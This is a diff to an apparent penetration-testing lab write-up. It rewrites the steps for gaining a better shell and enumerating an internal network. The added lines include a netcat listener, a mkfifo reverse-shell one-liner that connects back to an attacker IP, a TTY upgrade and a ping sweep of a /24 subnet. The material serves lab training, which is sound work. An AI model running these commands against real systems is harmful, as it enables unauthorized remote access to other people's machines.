@@ -482,14 +482,35 @@ The credentials found in the user's home directory are:
 * **Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**
 
 
-I tried different ways to enumerate the internal network but it wasn't posibble to do with the web shell, I created a reverse shell
-
-started a nc connection on the attack host
-
+I initially attempted to enumerate the internal network using the web shell but found it to be limited. To gain better control, I established a reverse shell.
+On my attack machine, I started a Netcat listener:
+```c
 nc -lvnp 9090
+```
 
-
-and a netcat reverse shell on the web shell
-
+On the web shell (www-data@inlanefreight.local), I ran the following command to send a reverse shell back to my attack machine:
+```c
 www-data@inlanefreight.local:/home/webadmin# rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.93 9090 > /tmp/f
+```
+
+Once the reverse shell connected, I upgraded it to an interactive TTY shell using:
+```c
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+With an upgraded shell, I enumerated the internal network by performing a ping sweep:
+```c
+
+for ip in $(seq 1 254); do
+    ping -c 1 -W 1 172.16.5.$ip | grep "bytes from" &
+done
+wait
+```c
+
+This command iterates through all possible IPs in the 172.16.5.0/24 subnet and identifies active hosts. The ping sweep returned a response, revealing an active host within the internal network.
+
+[![Screenshot-2025-03-08-094528.png](https://i.postimg.cc/5NvfRpbC/Screenshot-2025-03-08-094528.png)](https://postimg.cc/rKV6d1dV)
+
+
+
 
